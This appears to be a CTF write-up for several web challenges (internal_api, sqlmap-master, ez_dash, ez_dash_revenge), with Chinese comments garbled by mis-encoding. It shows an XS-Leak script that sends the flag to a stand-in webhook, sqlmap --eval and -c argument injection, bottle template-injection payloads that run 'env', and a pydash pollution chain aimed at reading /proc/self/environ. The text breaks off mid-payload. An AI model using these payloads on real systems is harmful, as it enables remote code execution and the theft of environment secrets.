[{"content":" misc ","date":"2025-03-30T00:00:00Z","permalink":"https://luo-kaihong.github.io/p/2025-nss%23round29-misc/","title":"2025-nss#round29-misc"},{"content":"web internal_api æ‰“XSLeak\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;script\u0026gt; function checkError(url) { // å®šä¹‰å‡½æ•°ï¼Œå‚æ•°åº”ä¸ºå°è¯•çš„æ–°flagï¼ˆä½†è¢«é”™è¯¯è¦†ç›–ï¼‰ url = \u0026#34;http://127.0.0.1:8000/internal/search?s=\u0026#34; + flag; // ğŸš¨é”™è¯¯ï¼šè¦†ç›–ä¼ å…¥çš„urlå‚æ•°ï¼Œå®é™…ä½¿ç”¨çš„flagå§‹ç»ˆæ˜¯å…¨å±€å˜é‡åˆå§‹å€¼ let script = document.createElement(\u0026#39;script\u0026#39;) // åˆ›å»º\u0026lt;script\u0026gt;æ ‡ç­¾ç”¨äºå‘èµ·è¯·æ±‚ let ret = false // ğŸš¨æœªä½¿ç”¨çš„å˜é‡ script.src = url // è®¾ç½®è„šæœ¬åœ°å€ï¼ˆå®é™…ä¸ºå›ºå®šåœ°å€ï¼Œæ— æ³•æµ‹è¯•æ–°å­—ç¬¦ï¼‰ script.onload = () =\u0026gt; { // è„šæœ¬åŠ è½½æˆåŠŸæ—¶è§¦å‘ fetch(\u0026#34;http://yourwebhook/?flag=\u0026#34; + flag) // å‘é€å½“å‰å…¨å±€flagåˆ°æ”»å‡»è€…æœåŠ¡å™¨ï¼ˆä½†å…¨å±€flagä»æœªæ›´æ–°ï¼‰ } script.onerror = (e) =\u0026gt; {} // åŠ è½½å¤±è´¥ä¸å¤„ç†ï¼ˆæœªåˆ©ç”¨é”™è¯¯ä¿¡æ¯ï¼‰ document.head.appendChild(script) // æ’å…¥è„šæœ¬ä»¥è§¦å‘è¯·æ±‚ } // å®šä¹‰å­—ç¬¦é›†å’Œå·²çŸ¥flagå‰ç¼€ let charset = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789-}\u0026#39; // çŒœæµ‹å­—ç¬¦èŒƒå›´ï¼ˆåŒ…å«é—­åˆç¬¦}ï¼‰ let flag = \u0026#39;flag{\u0026#39; // Flagçš„é€šç”¨å¼€å¤´ï¼ˆCTFå¸¸è§æ ¼å¼ï¼‰ // ä¸»çˆ†ç ´å¾ªç¯ for (let i = 0; i \u0026lt; charset.length; i++) { // éå†å­—ç¬¦é›† let c = charset[i] // è·å–å½“å‰å°è¯•çš„å­—ç¬¦ let newFlag = flag + c // ç»„åˆæ–°flagï¼ˆå¦‚flag{aï¼‰ checkError(newFlag) // ğŸš¨é”™è¯¯ï¼šä¼ å…¥å‚æ•°æœªè¢«å‡½æ•°ä½¿ç”¨ï¼Œå®é™…æ‰€æœ‰è¯·æ±‚ä»ä¸ºflag{ } \u0026lt;/script\u0026gt; æ¯æ¬¡è¿è¡Œçˆ†å‡ºä¸€ä½ï¼Œç„¶åæ‰‹åŠ¨åœ¨let flag = \u0026lsquo;flag{\u0026lsquo;ååŠ ä¸Šå³å¯\næ–‡ç«  - æµ…è°ˆXS-Leaksä¹‹Timeless timing attck - å…ˆçŸ¥ç¤¾åŒº\nsqlmap-master å…ˆå®¡è®¡ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from fastapi import FastAPI, Request # å¯¼å…¥FastAPIæ¡†æ¶åŠè¯·æ±‚å¯¹è±¡ from fastapi.responses import FileResponse, StreamingResponse # å¯¼å…¥æ–‡ä»¶å“åº”å’Œæµå¼å“åº”ç±» import subprocess # ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ app = FastAPI() # åˆ›å»ºFastAPIåº”ç”¨å®ä¾‹ @app.get(\u0026#34;/\u0026#34;) # å®šä¹‰æ ¹è·¯å¾„çš„GETè·¯ç”± async def index(): return FileResponse(\u0026#34;index.html\u0026#34;) # è¿”å›é™æ€æ–‡ä»¶index.htmlï¼ˆå‰ç«¯é¡µé¢ï¼‰ @app.post(\u0026#34;/run\u0026#34;) # å®šä¹‰/runè·¯å¾„çš„POSTè·¯ç”± async def run(request: Request): # æ¥æ”¶è¯·æ±‚å¯¹è±¡ data = await request.json() # å¼‚æ­¥è·å–è¯·æ±‚çš„JSONæ•°æ® url = data.get(\u0026#34;url\u0026#34;) # ä»æ•°æ®ä¸­æå–urlå‚æ•° if not url: # æ ¡éªŒurlå‚æ•°æ˜¯å¦å­˜åœ¨ return {\u0026#34;error\u0026#34;: \u0026#34;URL is required\u0026#34;} # è¿”å›é”™è¯¯ä¿¡æ¯ # æ„å»ºsqlmapå‘½ä»¤ï¼ˆå­˜åœ¨å®‰å…¨é£é™©ï¼è§ä¸‹æ–¹è­¦å‘Šï¼‰ command = f\u0026#39;sqlmap -u {url} --batch --flush-session\u0026#39; # ç›´æ¥æ‹¼æ¥å‚æ•°å¯èƒ½å¯¼è‡´å‘½ä»¤æ³¨å…¥æ¼æ´ def generate(): # å®šä¹‰ç”Ÿæˆå™¨å‡½æ•°ç”¨äºæµå¼è¾“å‡º # å¯åŠ¨å­è¿›ç¨‹æ‰§è¡Œå‘½ä»¤ process = subprocess.Popen( command.split(), # å°†å‘½ä»¤æŒ‰ç©ºæ ¼åˆ†å‰²æˆåˆ—è¡¨ï¼ˆç®€å•æ–¹å¼ï¼Œå¤æ‚å‚æ•°å¯èƒ½å‡ºé”™ï¼‰ stdout=subprocess.PIPE, # æ•è·æ ‡å‡†è¾“å‡º stderr=subprocess.STDOUT, # å°†é”™è¯¯è¾“å‡ºåˆå¹¶åˆ°æ ‡å‡†è¾“å‡º shell=False # ç¦ç”¨shellæ¨¡å¼ï¼ˆå®‰å…¨æœ€ä½³å®è·µï¼‰ ) while True: # æŒç»­è¯»å–è¾“å‡º output = process.stdout.readline() # é€è¡Œè¯»å–è¾“å‡º if output == \u0026#39;\u0026#39; and process.poll() is not None: # åˆ¤æ–­è¿›ç¨‹æ˜¯å¦ç»“æŸ break if output: # å¦‚æœæœ‰è¾“å‡ºå†…å®¹ yield output # ç”Ÿæˆè¾“å‡ºå†…å®¹ # è¿”å›æµå¼å“åº”ï¼ˆå®æ—¶æ˜¾ç¤ºæ‰«æç»“æœï¼‰ return StreamingResponse(generate(), media_type=\u0026#34;text/plain\u0026#34;) è¿™é‡Œshell=flase,æ„å‘³å†…å®¹ä¸ä¼šç»è¿‡ Shell çš„è¯­æ³•è§£æï¼Œå…¨è¢«å½“ä½œå‚æ•°çœ‹å¾…ï¼Œé‚£å°±ç›´æ¥æ‰¾æ‰¾sqlmapæœ‰å“ªäº›å¯ä»¥æ‰§è¡Œå‘½ä»¤æˆ–è€…è¯»æ–‡ä»¶çš„å‚æ•°\nsqlmap | GTFOBins\né€šè¿‡ \u0026ndash;eval å‚æ•°å¯ä»¥æ‰§â¾ Python ä»£ç , æ³¨æ„å› ä¸ºä¸Šâ¾¯ command.split() é»˜è®¤æ˜¯æŒ‰ç©ºæ ¼åˆ†éš”çš„ï¼ˆæ‰€ä»¥ä¸‹é¢çš„=å·å¯å˜ç©ºæ ¼ï¼‰ï¼Œæ³¨æ„è¿™â¾¥å‚æ•°çš„å€¼ä¸éœ€è¦åŠ ä¸Šå•åŒå¼•å·, å› ä¸ºä¸Šâ¾¯å·²ç»è®¾ç½®äº† shell=False , å¦‚æœåŠ ä¸Šå»åâ½½ä»£è¡¨çš„æ˜¯ \u0026ldquo;eval â¼€ä¸ª Python å­—ç¬¦ä¸²\u0026rdquo;ï¼Œç„¶åå°†payloadæ”¹ä¸ºç´§å‡‘å‹ï¼Œé¿å…ä½¿ç”¨åˆ†å·ã€‚\næœ€ç»ˆpayload\næœ€åæ‰“127.0.0.1 --eval=__import__('os').system('env')//ç­‰å·å¯ä»¥å˜ç©ºæ ¼\nç”¨æ³• | sqlmap ç”¨æˆ·æ‰‹å†Œ\nç¿»äº†ç¿»sqlmapæ‰‹å†Œï¼Œå‘ç°-cå¯ä»¥åŠ è½½é…ç½®æ–‡ä»¶é€‰é¡¹ã€\næ‰€ä»¥ä¹Ÿå¯ä»¥æ‰“\nhttps://localhost?id=1 -c /proc/self/environ //id=1æ²¡å®é™…ä½œç”¨ï¼Œæµ‹è¯•æ—¶å€™å†™çš„ï¼Œå¯ä»¥ä¸åŠ \nez_dash å®¡è®¡ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 # æç¤ºä¿¡æ¯ï¼šFlagåœ¨ç¯å¢ƒå˜é‡ä¸­ï¼Œè¿™å¯èƒ½æ„å‘³ç€ä»£ç ä¸­å­˜åœ¨æŸç§æ¼æ´ï¼Œå¯ä»¥é€šè¿‡æ¼æ´è·å–ç¯å¢ƒå˜é‡ä¸­çš„Flagå€¼ã€‚ from typing import Optional # å¯¼å…¥Optionalç±»å‹ï¼Œç”¨äºç±»å‹æ³¨è§£ import pydash # å¯¼å…¥pydashæ¨¡å—ï¼Œç”¨äºæ“ä½œå¯¹è±¡å±æ€§ import bottle # å¯¼å…¥bottleæ¡†æ¶ï¼Œç”¨äºåˆ›å»ºWebæœåŠ¡å™¨ # å®šä¹‰ä¸€ä¸ªåŒ…å«ç¦æ­¢è®¿é—®çš„å±æ€§è·¯å¾„çš„åˆ—è¡¨ï¼Œè¿™äº›è·¯å¾„é€šå¸¸æ˜¯Pythonå¯¹è±¡çš„å†…éƒ¨å±æ€§ï¼Œé˜²æ­¢ç”¨æˆ·é€šè¿‡è¿™äº›è·¯å¾„ç¯¡æ”¹å¯¹è±¡å†…éƒ¨ç»“æ„ã€‚ __forbidden_path__=[\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, \u0026#34;Optional\u0026#34;, \u0026#34;func\u0026#34;, \u0026#34;render\u0026#34;] # å®šä¹‰ä¸€ä¸ªåŒ…å«ç¦æ­¢è®¿é—®çš„åç§°çš„åˆ—è¡¨ï¼Œåˆå§‹æ—¶åŒ…å«\u0026#34;bottle\u0026#34;ï¼Œé˜²æ­¢ç”¨æˆ·ç›´æ¥æ“ä½œbottleæ¨¡å—ã€‚ __forbidden_name__=[\u0026#34;bottle\u0026#34;] # å°†å†…ç½®æ¨¡å—ä¸­çš„æ‰€æœ‰å±æ€§åç§°æ·»åŠ åˆ°ç¦æ­¢è®¿é—®çš„åç§°åˆ—è¡¨ä¸­ï¼Œé˜²æ­¢ç”¨æˆ·é€šè¿‡å†…ç½®æ¨¡å—è¿›è¡Œå±é™©æ“ä½œã€‚ __forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) # å®šä¹‰ä¸€ä¸ªå‡½æ•°setvalï¼Œç”¨äºè®¾ç½®æŒ‡å®šå¯¹è±¡çš„å±æ€§å€¼ã€‚ def setval(name:str, path:str, value:str) -\u0026gt; Optional[bool]: # å¦‚æœåç§°ä¸­åŒ…å«åŒä¸‹åˆ’çº¿ï¼ˆ__ï¼‰ï¼Œç›´æ¥è¿”å›Falseï¼Œé˜²æ­¢ç”¨æˆ·è®¿é—®Pythonçš„ç‰¹æ®Šæ–¹æ³•æˆ–å±æ€§ã€‚ if name.find(\u0026#34;__\u0026#34;)\u0026gt;=0: return False # éå†ç¦æ­¢è®¿é—®çš„åç§°åˆ—è¡¨ï¼Œå¦‚æœåç§°åœ¨åˆ—è¡¨ä¸­ï¼Œè¿”å›Falseã€‚ for word in __forbidden_name__: if name==word: return False # éå†ç¦æ­¢è®¿é—®çš„è·¯å¾„åˆ—è¡¨ï¼Œå¦‚æœè·¯å¾„ä¸­åŒ…å«åˆ—è¡¨ä¸­çš„å†…å®¹ï¼Œè¿”å›Falseã€‚ for word in __forbidden_path__: if path.find(word)\u0026gt;=0: return False # ä»å…¨å±€å˜é‡ä¸­è·å–æŒ‡å®šåç§°çš„å¯¹è±¡ã€‚ obj=globals()[name] try: # ä½¿ç”¨pydashæ¨¡å—çš„set_æ–¹æ³•è®¾ç½®å¯¹è±¡çš„å±æ€§å€¼ã€‚ pydash.set_(obj, path, value) except: # å¦‚æœè®¾ç½®å¤±è´¥ï¼Œè¿”å›Falseã€‚ return False # å¦‚æœè®¾ç½®æˆåŠŸï¼Œè¿”å›Trueã€‚ return True # å®šä¹‰ä¸€ä¸ªbottleçš„POSTè·¯ç”±/setValueï¼Œç”¨äºæ¥æ”¶ç”¨æˆ·è¯·æ±‚å¹¶è°ƒç”¨setvalå‡½æ•°è®¾ç½®å±æ€§å€¼ã€‚ @bottle.post(\u0026#39;/setValue\u0026#39;) def set_value(): # ä»è¯·æ±‚çš„æŸ¥è¯¢å‚æ•°ä¸­è·å–å¯¹è±¡åç§°ã€‚ name = bottle.request.query.get(\u0026#39;name\u0026#39;) # ä»è¯·æ±‚çš„JSONæ•°æ®ä¸­è·å–å±æ€§è·¯å¾„ã€‚ path = bottle.request.json.get(\u0026#39;path\u0026#39;) # å¦‚æœè·¯å¾„ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè¿”å›\u0026#34;no\u0026#34;ã€‚ if not isinstance(path, str): return \u0026#34;no\u0026#34; # å¦‚æœåç§°æˆ–è·¯å¾„é•¿åº¦è¶…è¿‡é™åˆ¶ï¼Œè¿”å›\u0026#34;no\u0026#34;ã€‚ if len(name) \u0026gt; 6 or len(path) \u0026gt; 32: return \u0026#34;no\u0026#34; # ä»è¯·æ±‚çš„JSONæ•°æ®ä¸­è·å–å±æ€§å€¼ã€‚ value = bottle.request.json.get(\u0026#39;value\u0026#39;) # è°ƒç”¨setvalå‡½æ•°è®¾ç½®å±æ€§å€¼ï¼Œæ ¹æ®è¿”å›å€¼è¿”å›\u0026#34;yes\u0026#34;æˆ–\u0026#34;no\u0026#34;ã€‚ return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; # å®šä¹‰ä¸€ä¸ªbottleçš„GETè·¯ç”±/renderï¼Œç”¨äºæ¸²æŸ“æ¨¡æ¿ã€‚ @bottle.get(\u0026#39;/render\u0026#39;) def render_template(): # ä»è¯·æ±‚çš„æŸ¥è¯¢å‚æ•°ä¸­è·å–æ¨¡æ¿è·¯å¾„ã€‚ path = bottle.request.query.get(\u0026#39;path\u0026#39;) # å¦‚æœè·¯å¾„ä¸­åŒ…å«\u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;.\u0026#34;ç­‰å­—ç¬¦ï¼Œè¿”å›\u0026#34;Hacker\u0026#34;ï¼Œé˜²æ­¢ç”¨æˆ·é€šè¿‡æ¨¡æ¿æ³¨å…¥æ”»å‡»ã€‚ if path.find(\u0026#34;{\u0026#34;) \u0026gt;= 0 or path.find(\u0026#34;}\u0026#34;) \u0026gt;= 0 or path.find(\u0026#34;.\u0026#34;) \u0026gt;= 0: return \u0026#34;Hacker\u0026#34; # ä½¿ç”¨bottleçš„templateæ–¹æ³•æ¸²æŸ“æ¨¡æ¿å¹¶è¿”å›ç»“æœã€‚ return bottle.template(path) # å¯åŠ¨bottleæœåŠ¡å™¨ï¼Œç›‘å¬0.0.0.0çš„8000ç«¯å£ã€‚ bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) è§£æ³•ä¸€ è¿™é‡Œæ²¡è¿‡æ»¤%ï¼Œæ‰€ä»¥åœ¨rendeè·¯ç”±å¯ä»¥æ‰§è¡Œpythonä»£ç ï¼ˆç±»ä¼¼æ‰“sstiï¼‰,paylaod\nåŸå‹æ˜¯%eval(\u0026quot;__import__('os').popen('env')\u0026quot;)ä½†æ˜¯è¿‡æ»¤äº†ç‚¹å·ï¼Œæ‰€ä»¥ç”¨chr(46)ä»£æ›¿ï¼Œç„¶åä¹Ÿä¸èƒ½å‡ºç°ç©ºæ ¼ï¼Œç„¶årenderåªèƒ½æ¸²æŸ“æ–‡ä»¶ï¼Œä¸èƒ½æ¸²æŸ“å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¦å°†envè¾“å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æœ€ç»ˆpyloadæ˜¯\n%eval(\u0026quot;__import__('os')\u0026quot;%2bchr(46)%2b\u0026quot;popen('env\u0026gt;1')\u0026quot;)\nè§£æ³•äºŒï¼šæ‰“abortæ— å›æ˜¾ 1 \u0026lt;%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput%0aa=getoutput(\u0026#34;env\u0026#34;)%0aabort(404,a)%20%\u0026gt; å†™æˆä»£ç å½¢å¼å¯èƒ½çœ‹å¾—æ‡‚ä¸€ç‚¹\n1 2 3 4 5 6 7 8 9 10 11 # ä»bottleåº“ä¸­å¯¼å…¥abortå‡½æ•°ï¼Œç”¨äºå‘é€HTTPé”™è¯¯å“åº” from bottle import abort # ä»subprocessåº“ä¸­å¯¼å…¥getoutputå‡½æ•°ï¼Œç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¹¶è·å–è¾“å‡º from subprocess import getoutput # æ‰§è¡Œç³»ç»Ÿå‘½ä»¤\u0026#34;env\u0026#34;ï¼Œè¯¥å‘½ä»¤ç”¨äºåˆ—å‡ºå½“å‰ç¯å¢ƒå˜é‡ï¼Œå¹¶å°†è¾“å‡ºå­˜å‚¨åœ¨å˜é‡aä¸­ a = getoutput(\u0026#34;env\u0026#34;) # ä½¿ç”¨abortå‡½æ•°å‘é€ä¸€ä¸ª404 HTTPé”™è¯¯å“åº”ï¼Œå¹¶å°†ç¯å¢ƒå˜é‡çš„è¾“å‡ºä½œä¸ºé”™è¯¯æ¶ˆæ¯è¿”å› abort(404, a) ez_dash_revenge æ­¤é¢˜è¿‡æ»¤äº†%ï¼Œæ‰€ä»¥æ— æ³•æ‰“ä¸Šé¢å¾—éé¢„æœŸï¼ˆå…¶å®ä¸Šé¢ä¹Ÿæ˜¯è€ƒåŸå‹æ±¡æŸ“é“¾ï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 from typing import Optional import pydash import bottle # ç¦æ­¢è®¿é—®çš„è·¯å¾„å±æ€§åˆ—è¡¨ï¼Œä¸»è¦æ˜¯Pythonå¯¹è±¡çš„ç‰¹æ®Šæ–¹æ³•å’Œå±æ€§ __forbidden_path__ = [\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, \u0026#34;Optional\u0026#34;, \u0026#34;render\u0026#34; ] # ç¦æ­¢è®¿é—®çš„åç§°åˆ—è¡¨ï¼ŒåŒ…æ‹¬bottleæ¨¡å—å’Œå†…ç½®å¯¹è±¡ __forbidden_name__ = [\u0026#34;bottle\u0026#34;] __forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) # è®¾ç½®å˜é‡å€¼çš„å‡½æ•° def setval(name: str, path: str, value: str) -\u0026gt; Optional[bool]: # å¦‚æœåç§°åŒ…å«åŒä¸‹åˆ’çº¿ï¼Œè¿”å›False if name.find(\u0026#34;__\u0026#34;) \u0026gt;= 0: return False # æ£€æŸ¥åç§°æ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨ä¸­ for word in __forbidden_name__: if name == word: return False # æ£€æŸ¥è·¯å¾„æ˜¯å¦åŒ…å«ç¦æ­¢çš„å±æ€§ for word in __forbidden_path__: if path.find(word) \u0026gt;= 0: return False # è·å–å…¨å±€å¯¹è±¡ obj = globals()[name] try: # ä½¿ç”¨pydash.set_æ–¹æ³•è®¾ç½®å¯¹è±¡çš„å±æ€§å€¼ pydash.set_(obj, path, value) except: # å¦‚æœè®¾ç½®å¤±è´¥ï¼Œè¿”å›False return False # è®¾ç½®æˆåŠŸï¼Œè¿”å›True return True # å¤„ç†POSTè¯·æ±‚çš„è·¯ç”±ï¼Œç”¨äºè®¾ç½®å˜é‡å€¼ @bottle.post(\u0026#39;/setValue\u0026#39;) def set_value(): # è·å–è¯·æ±‚ä¸­çš„nameå‚æ•° name = bottle.request.query.get(\u0026#39;name\u0026#39;) # è·å–è¯·æ±‚ä¸­çš„pathå‚æ•°ï¼Œå¿…é¡»æ˜¯å­—ç¬¦ä¸²ç±»å‹ path = bottle.request.json.get(\u0026#39;path\u0026#39;) if not isinstance(path, str): return \u0026#34;no\u0026#34; # æ£€æŸ¥nameå’Œpathçš„é•¿åº¦æ˜¯å¦è¶…å‡ºé™åˆ¶ if len(name) \u0026gt; 6 or len(path) \u0026gt; 32: return \u0026#34;no\u0026#34; # è·å–è¯·æ±‚ä¸­çš„valueå‚æ•° value = bottle.request.json.get(\u0026#39;value\u0026#39;) # è°ƒç”¨setvalå‡½æ•°è®¾ç½®å˜é‡å€¼ï¼Œå¹¶æ ¹æ®ç»“æœè¿”å›yesæˆ–no return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; # å¤„ç†GETè¯·æ±‚çš„è·¯ç”±ï¼Œç”¨äºæ¸²æŸ“æ¨¡æ¿ @bottle.get(\u0026#39;/render\u0026#39;) def render_template(): # è·å–è¯·æ±‚ä¸­çš„pathå‚æ•° path = bottle.request.query.get(\u0026#39;path\u0026#39;) # æ£€æŸ¥pathé•¿åº¦æ˜¯å¦è¶…å‡ºé™åˆ¶ if len(path) \u0026gt; 10: return \u0026#34;hacker\u0026#34; # å®šä¹‰é»‘åå•å­—ç¬¦ï¼Œé˜²æ­¢è·¯å¾„æ³¨å…¥ blacklist = [\u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;.\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;_\u0026#34;] # æ£€æŸ¥pathæ˜¯å¦åŒ…å«é»‘åå•å­—ç¬¦ for c in path: if c in blacklist: return \u0026#34;hacker\u0026#34; # ä½¿ç”¨bottle.templateæ¸²æŸ“æ¨¡æ¿ return bottle.template(path) # å¯åŠ¨bottleåº”ç”¨ï¼Œç›‘å¬æ‰€æœ‰æ¥å£çš„8000ç«¯å£ bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) æ­¤é¢˜å…ˆçœ‹æ‡‚setvalå‡½æ•°ï¼Œè¿™é‡Œé¢ pydash.set_(obj, path, value)å¾ˆé‡è¦ï¼Œå…¶ä¸­nameæ˜¯æˆ‘ä»¬è¦æ±¡æŸ“çš„å¯¹è±¡ï¼Œpathæ˜¯è¢«æ±¡æŸ“çš„åŠŸèƒ½ç‚¹è·¯å¾„ï¼Œvalueæ˜¯æˆ‘ä»¬æƒ³è®©è¿™ä¸ªå¯¹è±¡æˆä¸ºçš„å€¼ã€‚\nå†æ¥çœ‹æ­¤é¢˜ï¼Œç”±pydashçŸ¥https://github.com/dgilland/pydash/blob/develop/src/pydash/helpers.pyï¼Œpathæœ‰ä¸€ä¸ªbottle.TEMPLATE_PATH\u0026mdash;(æŒ‡å®šæ¨¡æ¿æ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„)ï¼Œæˆ‘ä»¬è¦æ±¡æŸ“ä»–çš„è·¯å¾„ï¼Œè®©ä»–æŒ‡å‘/proc/self/,ç„¶åå†æœ€ååœ¨ /render è·¯ç”±ä¸‹ GET ä¼ å‚ path ä¸º environ ï¼Œå¯¹å…¶è¿›â¾æ¸²æŸ“ï¼Œå°±å¯ä»¥è·å–ç¯å¢ƒå˜é‡äº†ï¼Œä½†æ˜¯pydashé™åˆ¶ä¸èƒ½éšæ„æ›´æ”¹bottleå±æ€§ï¼Œæ¥ä¸‹æ¥å®¡è®¡ä¸€ä¸‹pydashæºç ï¼Œå…³é”®é™åˆ¶ä»£ç å¦‚ä¸‹ï¼ˆæˆªå–äº†ä¸‰æ®µä»£ç ï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 def base_set(obj, key, value, allow_override=True): \u0026#34;\u0026#34;\u0026#34; Set an object\u0026#39;s `key` to `value`. If `obj` is a ``list`` and the `key` is the next available index position, append to list; otherwise, pad the list of ``None`` and then append to the list. Args: obj: Object to assign value to. key: Key or index to assign to. value: Value to assign. allow_override: Whether to allow overriding a previously set key. \u0026#34;\u0026#34;\u0026#34; # å¦‚æœobjæ˜¯å­—å…¸ç±»å‹ if isinstance(obj, dict): # å¦‚æœå…è®¸è¦†ç›–æˆ–è€…keyä¸åœ¨å­—å…¸ä¸­ if allow_override or key not in obj: # å°†keyå¯¹åº”çš„å€¼è®¾ç½®ä¸ºvalue obj[key] = value # å¦‚æœobjæ˜¯åˆ—è¡¨ç±»å‹ elif isinstance(obj, list): # å°†keyè½¬æ¢ä¸ºæ•´æ•°ç±»å‹ key = int(key) # å¦‚æœkeyå°äºåˆ—è¡¨çš„é•¿åº¦ if key \u0026lt; len(obj): # å¦‚æœå…è®¸è¦†ç›– if allow_override: # å°†åˆ—è¡¨ä¸­keyä½ç½®çš„å€¼è®¾ç½®ä¸ºvalue obj[key] = value else: # å¦‚æœkeyå¤§äºåˆ—è¡¨çš„é•¿åº¦ if key \u0026gt; len(obj): # ä½¿ç”¨Noneå¡«å……åˆ—è¡¨ï¼Œç›´åˆ°keyçš„ä½ç½® obj[:] = (obj + [None] * key)[:key] # åœ¨åˆ—è¡¨æœ«å°¾è¿½åŠ value obj.append(value) # å¦‚æœobjæ˜¯å…¶ä»–ç±»å‹ï¼Œå¹¶ä¸”å…è®¸è¦†ç›–æˆ–è€…è¯¥å±æ€§ä¸å­˜åœ¨ï¼Œå¹¶ä¸”objä¸æ˜¯None elif (allow_override or not hasattr(obj, key)) and obj is not None: # è°ƒç”¨_raise_if_restricted_keyå‡½æ•°æ£€æŸ¥æ˜¯å¦æ˜¯å—é™åˆ¶çš„é”® _raise_if_restricted_key(key) # ä½¿ç”¨setattrå‡½æ•°è®¾ç½®objçš„keyå±æ€§ä¸ºvalue setattr(obj, key, value) 1 RESTRICTED_KEYS = (\u0026#34;__globals__\u0026#34;, \u0026#34;__builtins__\u0026#34;) 1 2 3 4 def _raise_if_restricted_key(key): # Prevent access to restricted keys for security reasons. if key in RESTRICTED_KEYS: raise KeyError(f\u0026#34;access to restricted key {key!r} is not allowed\u0026#34;) æ‰€ä»¥æ¥ä¸‹æ¥æ€è·¯æ˜æ˜¾äº†ï¼Œå…ˆæ±¡æŸ“keyå‡½æ•°ä¸ºç©ºï¼Œä½¿æˆ‘ä»¬å¯ä»¥ç”¨globalsï¼Œç„¶åå†æ±¡æŸ“PATHï¼Œå†æ¸²æŸ“envrionå³å¯\nç”¨bpåœ¨/setValueæŠ“åŒ…\n1 2 3 name=pydash#æ±¡æŸ“å¯¹è±¡æ˜¯pydash path:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34; # 